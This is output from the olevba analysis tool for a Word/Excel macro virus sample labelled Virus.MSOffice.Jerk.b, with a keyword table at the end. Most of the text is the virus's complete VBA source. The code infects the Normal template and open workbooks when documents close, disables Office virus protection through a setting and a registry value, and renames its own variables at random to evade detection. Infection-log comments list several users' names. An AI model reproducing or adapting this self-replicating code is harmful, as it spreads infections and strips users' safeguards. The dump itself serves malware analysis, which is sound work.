olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-565e332bd5fada224d4b9d0a2bffad033f21c252
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-565e332bd5fada224d4b9d0a2bffad033f21c252 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 12:24:16: AM - Friday, 18 May 2001
' Client
'


' 11:41:19: PM - Wednesday, 13 Dec 2000
' Client
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const IDVMSFZDQ = 1, EQXYODX = True, HTVAEWCMKYZRLG = False, ONVHSEXX = 0
Dim LWGWVFVKUUXE, MPZHXTLLEVQSZXE As String
Dim TYQVWFINQ, CRVFDETJBL As Integer
Dim BMGCUXIK As Boolean
MPZHXTLLEVQSZXE = "ThisWorkbook"
LWGWVFVKUUXE = Application.ThisWorkbook.VBProject.VBComponents.Item(IDVMSFZDQ).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(IDVMSFZDQ).CodeModule.CountOfLines)
Call WJTPFEJFHJLAVDL(LWGWVFVKUUXE)
For TYQVWFINQ = IDVMSFZDQ To Application.Workbooks.Count
BMGCUXIK = HTVAEWCMKYZRLG
For CRVFDETJBL = IDVMSFZDQ To Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Count
If Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.CountOfLines = ONVHSEXX Then
If Application.Workbooks.Item(TYQVWFINQ).Path <> "" And Application.Workbooks.Item(TYQVWFINQ).Saved = EQXYODX And BMGCUXIK = HTVAEWCMKYZRLG Then BMGCUXIK = EQXYODX
Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.InsertLines IDVMSFZDQ, LWGWVFVKUUXE
If Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).Name = MPZHXTLLEVQSZXE Then
Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.ReplaceLine IDVMSFZDQ * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.ReplaceLine IDVMSFZDQ * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CRVFDETJBL
If BMGCUXIK = EQXYODX Then Application.Workbooks.Item(TYQVWFINQ).Save
Next TYQVWFINQ
End Sub
Private Sub Document_Close()
On Error Resume Next
Const EQXYODX = True, HTVAEWCMKYZRLG = False, ONVHSEXX = 0, IDVMSFZDQ = 1, DIFBEHEXTK = wdFormatDocument, GJZUHLMIW = wdFormatTemplate, VZJZRWNKWEKOI = ":"
Dim BMGCUXIK, RBHEQBRVLLFIV, RAUFHSL, QDXBSA As Boolean
Dim PAHWFH, QZANDARODA As Object
Dim BMCVMT, LWGWVFVKUUXE As String
If Month(IDVMSFZDQ * Now) > IDVMSFZDQ * 2 + IDVMSFZDQ * 3 And Day(IDVMSFZDQ * Now) = 4 + IDVMSFZDQ * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set PAHWFH = ActiveDocument.VBProject.VBComponents.Item(IDVMSFZDQ)
Set QZANDARODA = NormalTemplate.VBProject.VBComponents.Item(IDVMSFZDQ)
Randomize
RAUFHSL = HTVAEWCMKYZRLG
QDXBSA = HTVAEWCMKYZRLG
If PAHWFH.CodeModule.CountOfLines <> ONVHSEXX Then RAUFHSL = EQXYODX
If QZANDARODA.CodeModule.CountOfLines <> ONVHSEXX Then QDXBSA = EQXYODX
Options.VirusProtection = HTVAEWCMKYZRLG
If (RAUFHSL = EQXYODX Xor QDXBSA = EQXYODX) And (ActiveDocument.SaveFormat = DIFBEHEXTK Or ActiveDocument.SaveFormat = GJZUHLMIW) Then
If RAUFHSL = EQXYODX Then
RBHEQBRVLLFIV = NormalTemplate.Saved
LWGWVFVKUUXE = PAHWFH.CodeModule.Lines(IDVMSFZDQ, PAHWFH.CodeModule.CountOfLines)
Call GYECGZEWUVNOUDE(LWGWVFVKUUXE)
If Int(Rnd * 10 * IDVMSFZDQ) = IDVMSFZDQ * 7 Then Call ILGDOONVRFX(LWGWVFVKUUXE)
Call JRPYLOVP(LWGWVFVKUUXE)
QZANDARODA.CodeModule.InsertLines IDVMSFZDQ, LWGWVFVKUUXE
If RBHEQBRVLLFIV = EQXYODX Then NormalTemplate.Save
End If
BMCVMT = Mid(ActiveDocument.FullName, 2, IDVMSFZDQ)
If QDXBSA = EQXYODX And (BMCVMT = VZJZRWNKWEKOI Or ActiveDocument.Saved = HTVAEWCMKYZRLG) Then
BMGCUXIK = ActiveDocument.Saved
LWGWVFVKUUXE = QZANDARODA.CodeModule.Lines(IDVMSFZDQ, QZANDARODA.CodeModule.CountOfLines)
Call JRPYLOVP(LWGWVFVKUUXE)
PAHWFH.CodeModule.InsertLines IDVMSFZDQ, LWGWVFVKUUXE
If BMGCUXIK = EQXYODX Then ActiveDocument.Save
End If
End If
End Sub
Private Sub ILGDOONVRFX(ByRef LWGWVFVKUUXE As String)
On Error Resume Next
Const FBSIJFQMDFVWO = 48, YGIBFBKULNUKMW = 15, ZHEZDBNIEYE = 5, KYHHASID = 65, FLDXCMFHNSHG = 90, IDVMSFZDQ = 1, EQXYODX = True, HTVAEWCMKYZRLG = False
Dim UEQBESYMXTMDMQA, HHTSUTVOIGJABTmp, ULMSUKFDDTFEZ, HHTSUTVOIGJAB(IDVMSFZDQ To FBSIJFQMDFVWO), HHTSUTVOIGJAB2(IDVMSFZDQ To FBSIJFQMDFVWO) As String
Dim TYQVWFINQ, CRVFDETJBL, GRGCHBV As Integer
Dim PNKDHIPVIE As Boolean
UEQBESYMXTMDMQA = "LWGWVFVKUUXE FBSIJFQMDFVWO HHTSUTVOIGJAB HHTSUTVOIGJAB2 ULMSUKFDDTFEZ TYQVWFINQ CRVFDETJBL GRGCHBV PNKDHIPVIE ILGDOONVRFX YGIBFBKULNUKMW ZHEZDBNIEYE KYHHASID FLDXCMFHNSHG IDVMSFZDQ UEQBESYMXTMDMQA HHTSUTVOIGJABTmp BMGCUXIK RBHEQBRVLLFIV RAUFHSL QDXBSA PAHWFH QZANDARODA GYECGZEWUVNOUDE WEJRY PNATBXUUEJ CKHWNLN BIRZAFBWJ WEJRYTmp GXXZV KAPXMIDDMJ BMCVMT EQXYODX HTVAEWCMKYZRLG ONVHSEXX DIFBEHEXTK GJZUHLMIW IILFXFBMWS RMHDD VZJZRWNKWEKOI KAYSXL NUWQNLF MPZHXTLLEVQSZXE WJTPFEJFHJLAVDL JRPYLOVP LFTMRIDGPC RRTBSHEHRJIB NBGIM"
Randomize
CRVFDETJBL = IDVMSFZDQ
For TYQVWFINQ = IDVMSFZDQ To Len(UEQBESYMXTMDMQA)
If Mid(UEQBESYMXTMDMQA, TYQVWFINQ, IDVMSFZDQ) = " " Or TYQVWFINQ = Len(UEQBESYMXTMDMQA) Then
If TYQVWFINQ = Len(UEQBESYMXTMDMQA) Then HHTSUTVOIGJABTmp = HHTSUTVOIGJABTmp & Mid(UEQBESYMXTMDMQA, TYQVWFINQ, IDVMSFZDQ)
For GRGCHBV = IDVMSFZDQ To Int((YGIBFBKULNUKMW - ZHEZDBNIEYE + IDVMSFZDQ) * Rnd + ZHEZDBNIEYE)
HHTSUTVOIGJAB2(CRVFDETJBL) = HHTSUTVOIGJAB2(CRVFDETJBL) & Chr(Int((FLDXCMFHNSHG - KYHHASID + IDVMSFZDQ) * Rnd + KYHHASID))
Next GRGCHBV
HHTSUTVOIGJAB(CRVFDETJBL) = HHTSUTVOIGJABTmp
HHTSUTVOIGJABTmp = ""
CRVFDETJBL = CRVFDETJBL + IDVMSFZDQ
Else
HHTSUTVOIGJABTmp = HHTSUTVOIGJABTmp & Mid(UEQBESYMXTMDMQA, TYQVWFINQ, IDVMSFZDQ)
End If
Next TYQVWFINQ
PNKDHIPVIE = HTVAEWCMKYZRLG
For TYQVWFINQ = IDVMSFZDQ To Len(LWGWVFVKUUXE)
For CRVFDETJBL = IDVMSFZDQ To FBSIJFQMDFVWO
If Mid(LWGWVFVKUUXE, TYQVWFINQ, Len(HHTSUTVOIGJAB(CRVFDETJBL))) = HHTSUTVOIGJAB(CRVFDETJBL) Then
ULMSUKFDDTFEZ = ULMSUKFDDTFEZ & HHTSUTVOIGJAB2(CRVFDETJBL)
TYQVWFINQ = TYQVWFINQ + Len(HHTSUTVOIGJAB(CRVFDETJBL)) - IDVMSFZDQ
PNKDHIPVIE = EQXYODX
Exit For
End If
Next CRVFDETJBL
If PNKDHIPVIE = HTVAEWCMKYZRLG Then
ULMSUKFDDTFEZ = ULMSUKFDDTFEZ & Mid(LWGWVFVKUUXE, TYQVWFINQ, IDVMSFZDQ)
Else
PNKDHIPVIE = HTVAEWCMKYZRLG
End If
Next TYQVWFINQ
LWGWVFVKUUXE = ULMSUKFDDTFEZ
End Sub
Private Sub GYECGZEWUVNOUDE(ByRef LWGWVFVKUUXE As String)
On Error Resume Next
Const BIRZAFBWJ = "' ", IDVMSFZDQ = 1
Const IILFXFBMWS = "hh:mm:ss: AMPM - ", RMHDD = "dddd, d mmm yyyy"
Dim WEJRYTmp, WEJRY, GXXZV, KAPXMIDDMJ, PNATBXUUEJ, CKHWNLN As String
Dim TYQVWFINQ As Integer
PNATBXUUEJ = Chr(10 * IDVMSFZDQ + 3)
WEJRY = Application.UserAddress
KAPXMIDDMJ = Format(Time, IILFXFBMWS) & Format(Date, RMHDD)
CKHWNLN = Chr(IDVMSFZDQ * 10)
GXXZV = Application.UserName
For TYQVWFINQ = IDVMSFZDQ To Len(WEJRY)
If Mid(WEJRY, TYQVWFINQ, IDVMSFZDQ) <> PNATBXUUEJ Then
If Mid(WEJRY, TYQVWFINQ, IDVMSFZDQ) <> CKHWNLN Then
WEJRYTmp = WEJRYTmp & Mid(WEJRY, TYQVWFINQ, IDVMSFZDQ)
End If
Else
WEJRYTmp = WEJRYTmp & PNATBXUUEJ & BIRZAFBWJ
End If
Next TYQVWFINQ
LWGWVFVKUUXE = LWGWVFVKUUXE & PNATBXUUEJ & BIRZAFBWJ & KAPXMIDDMJ & PNATBXUUEJ & BIRZAFBWJ & GXXZV & PNATBXUUEJ & BIRZAFBWJ & WEJRY & PNATBXUUEJ
End Sub
Private Sub JRPYLOVP(ByVal LWGWVFVKUUXE As String)
On Error Resume Next
Dim NBGIM As Long
Dim KAYSXL As Object
Dim LFTMRIDGPC, RRTBSHEHRJIB As String
LFTMRIDGPC = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
NBGIM = &H0
RRTBSHEHRJIB = "Options6"
System.PrivateProfileString("", LFTMRIDGPC, RRTBSHEHRJIB) = NBGIM
Set KAYSXL = GetObject(, "Excel.Application")
Const IDVMSFZDQ = 1, ONVHSEXX = 0
Dim MPZHXTLLEVQSZXE As String
Dim TYQVWFINQ, CRVFDETJBL As Integer
MPZHXTLLEVQSZXE = "ThisWorkbook"
For TYQVWFINQ = IDVMSFZDQ To KAYSXL.Application.Workbooks.Count
For CRVFDETJBL = IDVMSFZDQ To KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Count
If KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.CountOfLines = ONVHSEXX Then
KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.InsertLines IDVMSFZDQ, LWGWVFVKUUXE
If KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).Name = MPZHXTLLEVQSZXE Then
KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.ReplaceLine 33 * IDVMSFZDQ, "Private Sub Workbook_Deactivate()"
Else
KAYSXL.Application.Workbooks.Item(TYQVWFINQ).VBProject.VBComponents.Item(CRVFDETJBL).CodeModule.ReplaceLine IDVMSFZDQ * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CRVFDETJBL
Next TYQVWFINQ
Set KAYSXL = Nothing
End Sub
Private Sub WJTPFEJFHJLAVDL(ByVal LWGWVFVKUUXE As String)
On Error Resume Next
Const EQXYODX = True, HTVAEWCMKYZRLG = False, IDVMSFZDQ = 1, ONVHSEXX = 0
Dim NUWQNLF As Object
Dim RBHEQBRVLLFIV As Boolean
Set NUWQNLF = GetObject(, "Word.Application")
If NUWQNLF.NormalTemplate.VBProject.VBComponents.Item(IDVMSFZDQ).CodeModule.CountOfLines = ONVHSEXX Then
RBHEQBRVLLFIV = NUWQNLF.NormalTemplate.Saved
NUWQNLF.Options.VirusProtection = HTVAEWCMKYZRLG
NUWQNLF.NormalTemplate.VBProject.VBComponents.Item(IDVMSFZDQ).CodeModule.InsertLines IDVMSFZDQ, LWGWVFVKUUXE
If RBHEQBRVLLFIV = EQXYODX Then NUWQNLF.NormalTemplate.Save
End If
Set NUWQNLF = Nothing
End Sub

' 12:42:08: PM - Thursday, 11 Feb 1999
' chris johnson
'

' 12:43:06: PM - Friday, 19 Feb 1999
' Bruce Powell
'

' 09:52:48: AM - Thursday, 25 Feb 1999
' Krista Veri
'

' 02:15:29: PM - Monday, 8 Mar 1999
' Terry Benvenuto
'

' 02:02:03: PM - Monday, 10 May 1999
' JO JO
'

' 11:39:07: AM - Friday, 15 Oct 1999
' dcti
'

' 02:25:10: PM - Friday, 19 Nov 1999
' student
'

' 11:56:23: AM - Wednesday, 24 Nov 1999
' Ibraheem Khan
'

' 01:30:44: AM - Sunday, 30 Jan 2000
' Ibraheem Khan
'

' 04:38:34: PM - Thursday, 30 Dec 1999
' student
'

' 04:13:32: PM - Wednesday, 1 Mar 2000
' Client
'

' 05:54:10: PM - Monday, 4 Mar 2002
' Client
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

